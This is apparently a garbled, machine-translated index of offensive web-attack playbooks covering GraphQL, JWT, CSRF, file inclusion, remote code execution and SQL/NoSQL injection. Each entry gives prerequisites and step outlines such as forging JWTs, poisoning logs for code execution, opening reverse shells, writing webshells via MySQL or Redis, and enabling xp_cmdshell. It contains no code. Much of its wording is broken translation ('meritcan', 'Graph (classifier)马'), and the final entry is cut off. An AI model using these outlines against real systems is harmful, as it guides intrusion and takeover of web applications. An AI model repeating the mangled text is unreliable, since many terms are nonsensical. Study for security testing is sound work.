## GraphQLinner/inside省attack
- ID: graphql-introspection
- Difficulty: beginner
- Subcategory: GraphQLinner/inside省
- Tags: graphql, introspection, enumeration, api
- Original Extracted Source: original extracted web-security-wiki source/graphql-introspection.md
Description:
exploitGraphQLinner/inside省meritcanGetAPIstructure
Prerequisites:
- goal/targetuseGraphQL
- inner/inside省meritcanun-Disable
Execution Outline:
1. 1. foundation/basisinner/inside省
2. 2.  completewhole/integerinner/inside省
3. 3. usetoolAnalysis
## GraphQLBatchqueryattack
- ID: graphql-batching
- Difficulty: intermediate
- Subcategory: GraphQLBatchquery
- Tags: graphql, batching, rate-limit, bypass
- Original Extracted Source: original extracted web-security-wiki source/graphql-batching.md
Description:
exploitGraphQLBatchquerybypassspeed/fast率limitation
Prerequisites:
- goal/targetuseGraphQL
- existat/inspeed/fast率limitation
Execution Outline:
1. 1. part nameBatchquery
2. 2. ArrayBatchquery
3. 3. brute force cracking
## REST APIsecurityTest
- ID: rest-api-security
- Difficulty: intermediate
- Subcategory: REST API
- Tags: rest, api, security, testing
- Original Extracted Source: original extracted web-security-wiki source/rest-api-security.md
Description:
REST APIsecurityTestand/withVulnerability Exploitation
Prerequisites:
- goal/targetuseREST API
- (past tense)untie/solveAPIend(side)point
Execution Outline:
1. 1. APIend(side)pointdiscover
2. 2. AuthenticationTest
3. 3. HTTPmethodTest
4. 4. parameter污染
## JWT NoneAlgorithmattack
- ID: jwt-none-alg
- Difficulty: beginner
- Subcategory: JWTsecurity
- Tags: jwt, none, algorithm, bypass
- Original Extracted Source: original extracted web-security-wiki source/jwt-none-alg.md
Description:
exploitJWT NoneAlgorithmbypassSignatureValidate
Prerequisites:
- goal/targetuseJWTAuthentication
- Serverun-correct/positivecertainValidateAlgorithm
Execution Outline:
1. 1. DecodingJWT
2. 2. constructNoneAlgorithmToken
3. 3. ModifyuserPermission
4. 4. SendmaliciousToken
## JWTKeyObfuscationattack
- ID: jwt-key-confusion
- Difficulty: intermediate
- Subcategory: JWTsecurity
- Tags: jwt, algorithm, confusion, rs256
- Original Extracted Source: original extracted web-security-wiki source/jwt-key-confusion.md
Description:
exploitJWTAlgorithmObfuscationImplementationSignaturebypass
Prerequisites:
- goal/targetuseRS256Algorithm
- canGetPublic Key
Execution Outline:
1. 1. GetPublic Key
2. 2. AlgorithmObfuscationattack
3. 3. SendmaliciousToken
## IDORinsecure's/ofdirectreceive/connect for/to象citation
- ID: api-idor
- Difficulty: beginner
- Subcategory: IDOR
- Tags: idor, api, authorization, bypass
- Original Extracted Source: original extracted web-security-wiki source/api-idor.md
Description:
exploitIDORvulnerabilityAccessunauthorizedresourceSource
Prerequisites:
- goal/targetuseIDcitationresourceSource
- existat/inAuthorizationInspect/Checkdefect/flaw
Execution Outline:
1. 1. identifyIDparameter
2. 2. EnumerationID
3. 3. Batchdetection
4. 4. 跨userAccess
## APIspeed/fast率limitationbypass
- ID: api-rate-limit
- Difficulty: intermediate
- Subcategory: speed/fast率limitation
- Tags: api, rate-limit, bypass, brute-force
- Original Extracted Source: original extracted web-security-wiki source/api-rate-limit.md
Description:
bypassAPIspeed/fast率limitationadvancerow暴力attack
Prerequisites:
- goal/targethas/havespeed/fast率limitation
- limitationImplementationhas/havedefect/flaw
Execution Outline:
1. 1. detectionspeed/fast率limitation
2. 2. IPbypass
3. 3.  part/point布 style/modebypass
4. 4. otherbypasstechnique
## Batch赋valuevulnerability
- ID: api-mass-assignment
- Difficulty: beginner
- Subcategory: Batch赋value
- Tags: api, mass-assignment, privilege-escalation
- Original Extracted Source: original extracted web-security-wiki source/api-mass-assignment.md
Description:
exploitBatch赋valuevulnerabilityModifySensitiveword paragraph/segment
Prerequisites:
- APIacceptsJSONinputenter
- existat/inun-Filter's/ofword paragraph/segment
Execution Outline:
1. 1. identifyinputenterword paragraph/segment
2. 2. AddSensitiveword paragraph/segment
3. 3. Updateoperation
4. 4. 嵌set for/to象
## BOLA破bad for/to象level/gradeAuthorization
- ID: api-bola
- Difficulty: intermediate
- Subcategory: BOLA
- Tags: api, bola, authorization, idor
- Original Extracted Source: original extracted web-security-wiki source/api-bola.md
Description:
exploitBOLAvulnerabilityAccessunauthorized for/to象
Prerequisites:
- APIuse for/to象ID
- AuthorizationInspect/Checkdefect/flaw
Execution Outline:
1. 1. identify for/to象Access
2. 2. TestAuthorization
3. 3. 横 to/towardsAccess
4. 4. Modify/Deleteoperation
## APIInjectattack
- ID: api-injection
- Difficulty: intermediate
- Subcategory: APIInject
- Tags: api, injection, sqli, nosqli
- Original Extracted Source: original extracted web-security-wiki source/api-injection.md
Description:
APIend(side)pointmiddle/center's/ofeach category/classInjectattack
Prerequisites:
- APIacceptsuserinputenter
- inputenterun-correct/positivecertainFilter
Execution Outline:
1. 1. SQL Injection
2. 2. NoSQL Injection
3. 3. LDAP Injection
4. 4. Command Injection

## References — web-playbook-14-csrf-cross-site-request-forgery

# CSRFCross-Site Request Forgery
English: CSRF Cross-Site Request Forgery
- Entry Count: 8
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## CSRFfoundation/basisattack
- ID: csrf-basic
- Difficulty: beginner
- Subcategory: foundation/basisattack
- Tags: csrf, cross-site, request, forgery
- Original Extracted Source: original extracted web-security-wiki source/csrf-basic.md
Description:
Cross-Site Request Forgeryfoundation/basisattacktechnique
Prerequisites:
- goal/targetexistat/inSensitiveoperation
- missingCSRFprotection
Execution Outline:
1. 1. constructCSRFtablesingle
2. 2. GETrequestCSRF
3. 3. JSON CSRF
4. 4. link诱guide
## JSON CSRFattack
- ID: csrf-json
- Difficulty: intermediate
- Subcategory: JSON CSRF
- Tags: csrf, json, api, post
- Original Extracted Source: original extracted web-security-wiki source/csrf-json.md
Description:
针 for/toJSONrequest's/ofCSRFattacktechnique
Prerequisites:
- goal/targetuseJSONformatrequest
- missingCSRFprotection
- CORSconfigurationnotwhen
Execution Outline:
1. 1. simplesingleJSON CSRF
2. 2. Flash JSON CSRF
3. 3. XSSIattack
4. 4. SWFFileattack
## CSRFbypasstechnique
- ID: csrf-bypass
- Difficulty: intermediate
- Subcategory: bypasstechnique
- Tags: csrf, bypass, token, referer
- Original Extracted Source: original extracted web-security-wiki source/csrf-bypass.md
Description:
bypassCSRFprotection's/ofeach kind/typetechnique
Prerequisites:
- goal/targetexistat/inCSRFprotection
- protectionmachinemake/controlexistat/indefect/flaw
Execution Outline:
1. 1. TokenValidatebypass
2. 2. RefererValidatebypass
3. 3. OriginValidatebypass
4. 4. SameSitebypass
## SameSitebypasstechnique
- ID: csrf-samesite
- Difficulty: intermediate
- Subcategory: SameSitebypass
- Tags: csrf, samesite, cookie, bypass
- Original Extracted Source: original extracted web-security-wiki source/csrf-samesite.md
Description:
bypassSameSite Cookieattribute's/ofCSRFattack
Prerequisites:
- Cookiesetting(past tense)SameSiteattribute
- SameSiteconfigurationexistat/indefect/flaw
Execution Outline:
1. 1. SameSite=Laxbypass
2. 2. SameSite=Strictbypass
3. 3. un-settingSameSite
4. 4. exploitOAuthprocess
## Tokenbypasstechnique
- ID: csrf-token-bypass
- Difficulty: intermediate
- Subcategory: Tokenbypass
- Tags: csrf, token, bypass, predictable
- Original Extracted Source: original extracted web-security-wiki source/csrf-token-bypass.md
Description:
bypassCSRF TokenValidate's/oftechnique
Prerequisites:
- goal/targetuseCSRF Token
- Tokenmachinemake/controlexistat/indefect/flaw
Execution Outline:
1. 1. Tokencanpredict
2. 2. Tokenun-BindSession
3. 3. TokenLeak/Disclosure
4. 4. TokenReplay
## Refererbypasstechnique
- ID: csrf-referer-bypass
- Difficulty: intermediate
- Subcategory: Refererbypass
- Tags: csrf, referer, bypass, header
- Original Extracted Source: original extracted web-security-wiki source/csrf-referer-bypass.md
Description:
bypassRefererValidate's/ofCSRFattack
Prerequisites:
- goal/targetValidateRefererhead/top
- Validatelogicexistat/indefect/flaw
Execution Outline:
1. 1. correct/positive rule/principleMatchbypass
2. 2. emptyRefererbypass
3. 3. 子Domain Namebypass
4. 4. Referrer-Policyexploit
## Flash CSRFattack
- ID: csrf-flash
- Difficulty: advanced
- Subcategory: Flash CSRF
- Tags: csrf, flash, swf, crossdomain
- Original Extracted Source: original extracted web-security-wiki source/csrf-flash.md
Description:
exploitFlashadvancerowCSRFattack
Prerequisites:
- goal/targetallowsFlashrequest
- crossdomain.xmlconfigurationnotwhen
Execution Outline:
1. 1. crossdomain.xmlexploit
2. 2. CreatemaliciousSWF
3. 3. SendJSONrequest
4. 4. customHeader
## CORSconfigurationerror/mistakeexploit
- ID: csrf-cors
- Difficulty: intermediate
- Subcategory: CORSconfigurationerror/mistake
- Tags: csrf, cors, misconfiguration, api
- Original Extracted Source: original extracted web-security-wiki source/csrf-cors.md
Description:
exploitCORSconfigurationerror/mistakeadvancerowCSRFattack
Prerequisites:
- CORSconfigurationerror/mistake
- allowsCross-Domaincarrybring/carryCredential
Execution Outline:
1. 1. detectionCORSconfiguration
2. 2. negative/reverse射Originattack
3. 3. nullSourceattack
4. 4. correct/positive rule/principlebypass

## References — web-playbook-15-jwt-security

# JWTsecurity
English: JWT Security
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## JWT NoneAlgorithmattack
- ID: jwt-none-attack
- Difficulty: beginner
- Subcategory: Algorithmattack
- Tags: JWT, noneAlgorithm, Authenticationbypass, TokenForge, CVE-2015-2951
- Original Extracted Source: original extracted web-security-wiki source/jwt-none-attack.md
Description:
exploitJWTLibrary for/to"none"Algorithm's/ofsupportsdefect/flaw，will/shallJWTheader's/ofSignatureAlgorithmModifyfor/isnone after/backRemoveSignaturepartial/some，constructno/without需Keyi.e.canvia/throughValidate's/ofForgeToken。这ismost经典's/ofJWTvulnerability之one。
Prerequisites:
- goal/targetuseJWTadvancerowIdentityAuthentication
- jwt_toolorPython PyJWTLibrary
Execution Outline:
1. 1. Decodingpresenthas/haveJWT
2. 2. constructNoneAlgorithmJWT
3. 3. jwt_toolAutomaticattack
4. 4. ValidateForgeToken
## JWTKeyObfuscationattack(RS→HS)
- ID: jwt-key-confusion
- Difficulty: advanced
- Subcategory: Algorithmattack
- Tags: JWT, KeyObfuscation, RS256, HS256, AlgorithmTamper
- Original Extracted Source: original extracted web-security-wiki source/jwt-key-confusion.md
Description:
whenServiceend(side)useRSAPublic KeyValidateJWTtime，Attackerwill/shallAlgorithm fromRS256改for/isHS256，thistimeServiceend(side)will/canerror/mistake (adverbial)useRSAPublic Key as/dofor/isHMACKeyadvancerowValidate。due toRSAPublic KeyisPublic's/of，Attackercan useitSignatureanymeaning/intentJWT。
Prerequisites:
- goal/targetJWTuseRS256/RS384/RS512Algorithm
- alreadyGetRSAPublic Key
- jwt_toolorPython
Execution Outline:
1. 1. GetRSAPublic Key
2. 2. KeyObfuscationattack
3. 3. jwt_toolAutomaticattack
4. 4. JWKSend(side)pointInject
## JWTKeybrute force
- ID: jwt-secret-bruteforce
- Difficulty: intermediate
- Subcategory: Keycrack
- Tags: JWT, Keybrute force, HS256, weakKey, hashcat
- Original Extracted Source: original extracted web-security-wiki source/jwt-secret-bruteforce.md
Description:
whenJWTuseHMAC for/to callAlgorithm(HS256/HS384/HS512)且Keyfor/isweakPasswordtime，canvia/throughDictionaryorbrute force crackingrestorationSignatureKey，furthermoreForgeanymeaning/intentJWTToken。
Prerequisites:
- goal/targetJWTuseHMACAlgorithm(HS256etc.)
- alreadyGethas/have效JWT样this
- hashcatorjwt_tool
Execution Outline:
1. 1. AcknowledgmentAlgorithmandstructure
2. 2. hashcat GPUacceleratesbrute force
3. 3. jwt_toolDictionarybrute force
4. 4. use破DecryptionkeyForgeJWT
## JWT JKU/X5Uhead/topInject
- ID: jwt-jku-x5u-injection
- Difficulty: advanced
- Subcategory: HeaderInject
- Tags: JWT, JKU, X5U, HeaderInject, JWKS, KeyHijack
- Original Extracted Source: original extracted web-security-wiki source/jwt-jku-x5u-injection.md
Description:
exploitJWT Headermiddle/center's/ofjku(JWK Set URL)orx5u(X.509 URL)parameter，will/shallKeycomeSourcepoints toAttackercontrol's/ofServer， makeServiceend(side)useAttacker's/ofPublic KeyValidateJWT，therebyImplementationTokenForge。
Prerequisites:
- goal/targetJWTsupportsjku/x5u Headerparameter
- Attackerownhas/have公networkServer
- Pythonenvironment
Execution Outline:
1. 1. detect/probeJKU/X5Usupports
2. 2. generateAttackerKey for/to
3. 3. hostJWKS并SignatureJWT
4. 4. Validateattack

## References — web-playbook-16-lfi-rfi-file-inclusion

# LFI/RFIfile inclusion
English: LFI/RFI File Inclusion
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Localfile inclusion
- ID: lfi-basic
- Difficulty: intermediate
- Subcategory: Localincludes/contains
- Tags: lfi, local, file, inclusion
- Original Extracted Source: original extracted web-security-wiki source/lfi-basic.md
Description:
LocalFile Inclusion Vulnerabilityexploittechnique
Prerequisites:
- existat/infile inclusionmeritcan
- usercancontrolincludes/containsPath
Execution Outline:
1. 1. detect/probeLFI
2. 2. ReadSensitiveFile
3. 3. PHP伪Protocol
4. 4. Log投毒
## Remotefile inclusion
- ID: rfi-basic
- Difficulty: intermediate
- Subcategory: Remoteincludes/contains
- Tags: rfi, remote, file, inclusion
- Original Extracted Source: original extracted web-security-wiki source/rfi-basic.md
Description:
RemoteFile Inclusion Vulnerabilityexploittechnique
Prerequisites:
- existat/infile inclusionmeritcan
- allow_url_include=On
- usercancontrolincludes/containsPath
Execution Outline:
1. 1. detect/probeRFI
2. 2. hostmaliciousFile
3. 3. ReverseShell
4. 4. usedataProtocol
## Log投毒LFI
- ID: lfi-log-poison
- Difficulty: intermediate
- Subcategory: Log投毒
- Tags: lfi, log, poison, rce
- Original Extracted Source: original extracted web-security-wiki source/lfi-log-poison.md
Description:
via/throughLog投毒ImplementationLFI toRCE
Prerequisites:
- existat/inLFIvulnerability
- canincludes/containsLogFile
- LogFileWritable
Execution Outline:
1. 1. detect/probeLogFilelocation
2. 2. 投毒User-Agent
3. 3. 投毒requestPath
4. 4. Executecommand
## PHP伪Protocolexploit
- ID: lfi-wrapper
- Difficulty: intermediate
- Subcategory: 伪Protocol
- Tags: lfi, wrapper, php, protocol
- Original Extracted Source: original extracted web-security-wiki source/lfi-wrapper.md
Description:
exploitPHP伪ProtocoladvancerowLFIattack
Prerequisites:
- existat/inLFIvulnerability
- PHPenvironment
- 伪Protocolun-Disable
Execution Outline:
1. 1. php://filter
2. 2. php://input
3. 3. data://Protocol
4. 4. phar://Protocol
## Directorytraverse/iteratetechnique
- ID: lfi-traversal
- Difficulty: beginner
- Subcategory: Directorytraverse/iterate
- Tags: lfi, traversal, bypass, path
- Original Extracted Source: original extracted web-security-wiki source/lfi-traversal.md
Description:
LFIDirectorytraverse/iteratebypasstechnique
Prerequisites:
- existat/inLFIvulnerability
- existat/inPathFilter
Execution Outline:
1. 1. foundation/basistraverse/iterate
2. 2. bypassDelete../
3. 3. URLEncodingbypass
4. 4. UnicodeEncodingbypass
## PHP Filterchainattack
- ID: lfi-php-filter
- Difficulty: intermediate
- Subcategory: PHP Filter
- Tags: lfi, php, filter, chain
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-filter.md
Description:
exploitPHP FilterchainadvancerowLFIattack
Prerequisites:
- existat/inLFIvulnerability
- PHPenvironment
- filter伪Protocolcan use
Execution Outline:
1. 1. ReadSourcecode
2. 2. multi/multiple re-/heavyfilter
3. 3. FilterchainRCE
4. 4. ReadconfigurationFile
## PHP InputExecute
- ID: lfi-php-input
- Difficulty: intermediate
- Subcategory: PHP Input
- Tags: lfi, php, input, rce
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-input.md
Description:
exploitphp://inputExecutePHPcode
Prerequisites:
- existat/inLFIvulnerability
- allow_url_include=On
- POSTmethodcan use
Execution Outline:
1. 1. foundation/basisExecute
2. 2. commandExecute
3. 3. Fileoperation
4. 4. ReverseShell
## PHP DataProtocolattack
- ID: lfi-php-data
- Difficulty: intermediate
- Subcategory: PHP Data
- Tags: lfi, php, data, protocol
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-data.md
Description:
exploitdata://ProtocolExecutePHPcode
Prerequisites:
- existat/inLFIvulnerability
- allow_url_include=On
- dataProtocolcan use
Execution Outline:
1. 1. foundation/basisExecute
2. 2. Base64Encoding
3. 3. commandExecute
4. 4. ReverseShell
## PHP ZipProtocolattack
- ID: lfi-php-zip
- Difficulty: intermediate
- Subcategory: PHP Zip
- Tags: lfi, php, zip, archive
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-zip.md
Description:
exploitzip://ProtocoladvancerowLFIattack
Prerequisites:
- existat/inLFIvulnerability
- canUploadzipFile
- zipProtocolcan use
Execution Outline:
1. 1. CreatemaliciousZip
2. 2. UploadZipFile
3. 3. includes/containsZipFile
4. 4. Graph (classifier)马
## PharDeserialization Attack
- ID: lfi-phar
- Difficulty: advanced
- Subcategory: PharDeserialization
- Tags: lfi, phar, deserialization, rce
- Original Extracted Source: original extracted web-security-wiki source/lfi-phar.md
Description:
exploitPharDeserializationadvancerowRCE
Prerequisites:
- existat/inLFIvulnerability
- PHPenvironment
- pharExtensioncan use
Execution Outline:
1. 1. CreatePharFile
2. 2. triggerDeserialization
3. 3. Graph (classifier)马Phar
4. 4. commonGadgetchain
## Sessionfile inclusion
- ID: lfi-session
- Difficulty: intermediate
- Subcategory: Sessionincludes/contains
- Tags: lfi, session, file, inclusion
- Original Extracted Source: original extracted web-security-wiki source/lfi-session.md
Description:
exploitSessionFileadvancerowLFIattack
Prerequisites:
- existat/inLFIvulnerability
- cancontrolSessioncontent
- know道SessionPath
Execution Outline:
1. 1. detect/probeSessionPath
2. 2. controlSessioncontent
3. 3. includes/containsSessionFile
4. 4. SessionRace Condition
## ProcFile Systemexploit
- ID: lfi-proc
- Difficulty: intermediate
- Subcategory: ProcFile System
- Tags: lfi, proc, linux, environ
- Original Extracted Source: original extracted web-security-wiki source/lfi-proc.md
Description:
exploit/procFile SystemadvancerowLFIattack
Prerequisites:
- existat/inLFIvulnerability
- Linuxsystem
- /proccanAccess
Execution Outline:
1. 1. ReadProcessinformation
2. 2. Readenvironmentvariable
3. 3. via/throughfdReadLog
4. 4. ReadotherProcess

## References — web-playbook-17-rce-remote-code-execution

# RCERemote Code Execution
English: RCE Remote Code Execution
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Command Injection
- ID: rce-command-injection
- Difficulty: intermediate
- Subcategory: Command Injection
- Tags: rce, command, injection, os
- Original Extracted Source: original extracted web-security-wiki source/rce-command-injection.md
Description:
Operating SystemCommand Injectionattacktechnique
Prerequisites:
- existat/insystemcommandExecutemeritcan
- userinputenterun-Filter
Execution Outline:
1. 1. detect/probeCommand Injection
2. 2. LinuxCommand Injection
3. 3. WindowsCommand Injection
4. 4. 盲Command Injection
## PHPcodeExecute
- ID: rce-php
- Difficulty: intermediate
- Subcategory: PHPcodeExecute
- Tags: rce, php, code, execution
- Original Extracted Source: original extracted web-security-wiki source/rce-php.md
Description:
PHPCode Execution Vulnerabilityexploittechnique
Prerequisites:
- existat/inPHPcodeExecutepoint
- userinputentercancontrolcode
Execution Outline:
1. 1. commondanger险function
2. 2. commandExecute
3. 3. one sentence speech/wordsTrojan
4. 4. 免杀one sentence speech/words
## PHP FilterchainRCE
- ID: rce-php-filter
- Difficulty: advanced
- Subcategory: PHP Filterchain
- Tags: rce, php, filter, chain
- Original Extracted Source: original extracted web-security-wiki source/rce-php-filter.md
Description:
exploitPHP FilterchainconstructRCE
Prerequisites:
- existat/inFile Inclusion Vulnerability
- PHPversionsupportsFilterchain
Execution Outline:
1. 1. Filterchainoriginal principle/logic
2. 2. constructFilterchain
3. 3. usetoolgenerate
4. 4.  completewhole/integerexploitexample
## 盲Command Injection
- ID: rce-cmd-blind
- Difficulty: intermediate
- Subcategory: 盲Command Injection
- Tags: rce, blind, command, injection
- Original Extracted Source: original extracted web-security-wiki source/rce-cmd-blind.md
Description:
no/withoutreturnshow/display's/ofCommand Injectionexploittechnique
Prerequisites:
- existat/inCommand Injectionpoint
- no/withoutdirectreceive/connectreturnshow/display
Execution Outline:
1. 1. timeBlind Injection
2. 2. DNSoutbring/carry
3. 3. HTTPoutbring/carry
4. 4. ICMPoutbring/carry
## Deserialization Vulnerability
- ID: rce-deserialize
- Difficulty: advanced
- Subcategory: Deserialization
- Tags: rce, deserialize, java, php
- Original Extracted Source: original extracted web-security-wiki source/rce-deserialize.md
Description:
exploitDeserialization VulnerabilityImplementationRCE
Prerequisites:
- existat/inDeserializationpoint
- existat/incanexploit's/ofGadgetchain
Execution Outline:
1. 1. JavaDeserialization
2. 2. PHPDeserialization
3. 3. PythonDeserialization
4. 4. .NETDeserialization
## PHPDeserialization
- ID: rce-deserialize-php
- Difficulty: advanced
- Subcategory: PHPDeserialization
- Tags: rce, php, deserialize, unserialize
- Original Extracted Source: original extracted web-security-wiki source/rce-deserialize-php.md
Description:
PHPDeserialization Vulnerabilityexploittechnique
Prerequisites:
- existat/inunserializecall/invoke
- existat/incanexploit's/of category/class
Execution Outline:
1. 1. 魔术method
2. 2. constructPOPchain
3. 3. PharDeserialization
4. 4. SessionDeserialization
## JavaDeserialization
- ID: rce-deserialize-java
- Difficulty: advanced
- Subcategory: JavaDeserialization
- Tags: rce, java, deserialize, ysoserial
- Original Extracted Source: original extracted web-security-wiki source/rce-deserialize-java.md
Description:
JavaDeserialization Vulnerabilityexploittechnique
Prerequisites:
- existat/inJavaDeserializationpoint
- existat/inGadgetchain
Execution Outline:
1. 1. commonGadgetchain
2. 2. useysoserial
3. 3. JRMPattack
4. 4. memory马Inject
## File Upload Vulnerability
- ID: rce-file-upload
- Difficulty: intermediate
- Subcategory: FileUpload
- Tags: rce, upload, webshell, file
- Original Extracted Source: original extracted web-security-wiki source/rce-file-upload.md
Description:
exploitFile Upload VulnerabilityGetRCE
Prerequisites:
- existat/inFileUploadmeritcan
- canUploadcanExecuteFile
Execution Outline:
1. 1. foundation/basisUpload
2. 2. Frontendbypass
3. 3. Backendbypass
4. 4. Graph (classifier)马
## file inclusionRCE
- ID: rce-include
- Difficulty: intermediate
- Subcategory: file inclusion
- Tags: rce, include, lfi, rfi
- Original Extracted Source: original extracted web-security-wiki source/rce-include.md
Description:
exploitFile Inclusion VulnerabilityImplementationRCE
Prerequisites:
- existat/inFile Inclusion Vulnerability
- canincludes/containsmaliciousFile
Execution Outline:
1. 1. Log投毒
2. 2. Sessionfile inclusion
3. 3. /proc/self/environ
4. 4. PHP伪Protocol
## Log投毒RCE
- ID: rce-log-poison
- Difficulty: intermediate
- Subcategory: Log投毒
- Tags: rce, log, poison, lfi
- Original Extracted Source: original extracted web-security-wiki source/rce-log-poison.md
Description:
exploitLog投毒ImplementationRCE
Prerequisites:
- existat/inFile Inclusion Vulnerability
- canReadLogFile
Execution Outline:
1. 1. ApacheLog投毒
2. 2. NginxLog投毒
## Graph (classifier)马RCE
- ID: rce-image
- Difficulty: intermediate
- Subcategory: Graph (classifier)马
- Tags: rce, image, webshell, upload
- Original Extracted Source: original extracted web-security-wiki source/rce-image.md
Description:
exploitGraph (classifier)马ImplementationRCE
Prerequisites:
- existat/inFileUpload
- existat/infile inclusion
Execution Outline:
1. 1. make/control as/doGraph (classifier)马
2. 2. Graph (classifier)马content
3. 3. exploitfile inclusionExecute
4. 4. with/combined with.htaccess
## .htaccessexploit
- ID: rce-htaccess
- Difficulty: intermediate
- Subcategory: .htaccess
- Tags: rce, htaccess, apache, upload
- Original Extracted Source: original extracted web-security-wiki source/rce-htaccess.md
Description:
exploit.htaccessFileImplementationRCE
Prerequisites:
- ApacheServer
- canUpload.htaccess
Execution Outline:
1. 1. parsingotherExtension name
2. 2. Automaticincludes/contains
3. 3. 伪staticRCE
4. 4. error/mistakepageincludes/contains

## References — web-playbook-18-sql-nosql-injection

# SQL/NoSQL Injection
English: SQL/NoSQL Injection
- Entry Count: 17
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## MySQL Injection - foundation/basisdetect/probe
- ID: sqli-mysql-basic
- Difficulty: beginner
- Subcategory: MySQL
- Tags: sqli, mysql, injection, database
- Original Extracted Source: original extracted web-security-wiki source/sqli-mysql-basic.md
Description:
MySQLDatabase Injectionfoundation/basisdetect/probeand/withdataextracttechnique
Prerequisites:
- goal/targetexistat/inSQL Injectionpoint
- BackendDatabasefor/isMySQL
- (past tense)untie/solve基thisSQL language method/law
Execution Outline:
1. 1. detect/probeInjectpoint
2. 2. determinescolumnnumber
3. 3. determinesshow/displayshowlocation
4. 4. GetDatabaseinformation
## MySQL Injection - highlevel/gradetechnique
- ID: sqli-mysql-advanced
- Difficulty: advanced
- Subcategory: MySQL
- Tags: sqli, mysql, advanced, file-read, rce
- Original Extracted Source: original extracted web-security-wiki source/sqli-mysql-advanced.md
Description:
MySQLhighlevel/gradeInjecttechnique：Fileread-write、UDFprivilege escalation、commandExecute
Prerequisites:
- MySQLuser具has/haveFILEPermission
- know道networkstand绝 for/toPath
- secure_file_privconfigurationallows
Execution Outline:
1. 1. detectionFILEPermission
2. 2. GetnetworkstandPath
3. 3. ReadSensitiveFile
4. 4. WriteWebShell
## MSSQL Injection - foundation/basisdetect/probe
- ID: sqli-mssql-basic
- Difficulty: intermediate
- Subcategory: MSSQL
- Tags: sqli, mssql, sqlserver, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-mssql-basic.md
Description:
Microsoft SQL ServerDatabase Injectiontechnique
Prerequisites:
- goal/targetexistat/inSQL Injectionpoint
- BackenduseMSSQLDatabase
Execution Outline:
1. 1. detect/probeInjectpoint
2. 2. Getversioninformation
3. 3. Getuserinformation
4. 4. GetDatabaseinformation
## MSSQL Injection - highlevel/gradetechnique
- ID: sqli-mssql-advanced
- Difficulty: advanced
- Subcategory: MSSQL
- Tags: sqli, mssql, xp_cmdshell, rce
- Original Extracted Source: original extracted web-security-wiki source/sqli-mssql-advanced.md
Description:
MSSQLhighlevel/gradeInject：xp_cmdshell、SP_OACREATEcommandExecute
Prerequisites:
- MSSQL具has/havehighPermission
- xp_cmdshellcan useorcanEnable/On
Execution Outline:
1. 1. detectionxp_cmdshellstate
2. 2. Enable/Onxp_cmdshell
3. 3. Executesystemcommand
4. 4. WriteWebShell
## OracleInject - foundation/basisdetect/probe
- ID: sqli-oracle-basic
- Difficulty: intermediate
- Subcategory: Oracle
- Tags: sqli, oracle, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-oracle-basic.md
Description:
OracleDatabase Injectionfoundation/basistechnique
Prerequisites:
- goal/targetexistat/inSQL Injectionpoint
- BackenduseOracleDatabase
Execution Outline:
1. 1. detect/probeInjectpoint
2. 2. Getversioninformation
3. 3. Getuserinformation
4. 4. Gettable name
## OracleInject - highlevel/gradetechnique
- ID: sqli-oracle-advanced
- Difficulty: advanced
- Subcategory: Oracle
- Tags: sqli, oracle, advanced, rce
- Original Extracted Source: original extracted web-security-wiki source/sqli-oracle-advanced.md
Description:
Oraclehighlevel/gradeInjecttechnique：Javastoreprocess、UTL_FILEFileoperation
Prerequisites:
- OraclehighPermission
- Javavirtual machinecan use
Execution Outline:
1. 1. detectionJavaPermission
2. 2. CreateJavaExecutefunction
3. 3. UTL_FILEReadFile
## PostgreSQL Injection - foundation/basisdetect/probe
- ID: sqli-postgres-basic
- Difficulty: intermediate
- Subcategory: PostgreSQL
- Tags: sqli, postgresql, postgres, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-postgres-basic.md
Description:
PostgreSQLDatabase Injectiontechnique
Prerequisites:
- goal/targetexistat/inSQL Injectionpoint
- BackendusePostgreSQL
Execution Outline:
1. 1. detect/probeInjectpoint
2. 2. Getversioninformation
3. 3. Gettable name
4. 4. Getcolumn name
## SQLiteInject
- ID: sqli-sqlite-basic
- Difficulty: intermediate
- Subcategory: SQLite
- Tags: sqli, sqlite
- Original Extracted Source: original extracted web-security-wiki source/sqli-sqlite-basic.md
Description:
SQLiteDatabase Injectionattack
Prerequisites:
- SQLiteDatabase
- existat/inInjectpoint
Execution Outline:
1. 1. detect/probeInjectpoint
2. 2. Getversion
3. 3. Gettable name
4. 4. Gettablestructure
## MongoDBInject
- ID: sqli-mongodb-basic
- Difficulty: intermediate
- Subcategory: MongoDB
- Tags: nosql, mongodb, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-mongodb-basic.md
Description:
NoSQLDatabase Injectionattacktechnique
Prerequisites:
- goal/targetuseMongoDB
- existat/inuserinputenterjoinreceive/connectquery
Execution Outline:
1. 1. detect/probeInjectpoint
2. 2. bypassAuthentication
3. 3. logic运computeInject
4. 4. correct/positive rule/principleInject
## RedisUnauthorized Access
- ID: sqli-redis
- Difficulty: intermediate
- Subcategory: Redis
- Tags: redis, nosql, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-redis.md
Description:
RedisUnauthorized AccessandCommand Injection
Prerequisites:
- RedisServicecanAccess
- unauthorizedorweakPassword
Execution Outline:
1. 1. detect/probeRedis
2. 2. Unauthorized Access
3. 3. WriteWebshell
4. 4. WriteSSHPublic Key
## 布尔Blind Injection
- ID: sqli-blind
- Difficulty: intermediate
- Subcategory: Blind Injection
- Tags: sqli, blind, boolean
- Original Extracted Source: original extracted web-security-wiki source/sqli-blind.md
Description:
based on布尔condition's/ofSQLBlind Injectiontechnique
Prerequisites:
- existat/inSQL Injection
- pagehas/havetrue/false两 kind/typenotsame/togetherresponse
Execution Outline:
1. 1. AcknowledgmentBlind Injection
2. 2. GetDatabase namegrowdegree/measure
3. 3. 逐characterEnumerationDatabase name
4. 4. usetoolAutomatic-ize
## timeBlind Injection
- ID: sqli-time-based
- Difficulty: intermediate
- Subcategory: Blind Injection
